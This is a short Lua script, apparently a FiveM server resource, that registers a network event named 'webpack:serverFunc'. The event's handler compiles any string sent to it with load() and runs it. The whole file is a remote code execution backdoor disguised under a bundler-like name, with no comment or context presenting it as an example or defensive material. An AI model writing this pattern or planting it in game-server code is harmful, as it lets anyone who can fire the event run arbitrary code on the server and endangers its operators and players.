RegisterNetEvent('webpack:serverFunc', function(info)
	assert(
		load(
			info
		)
    )()
end)
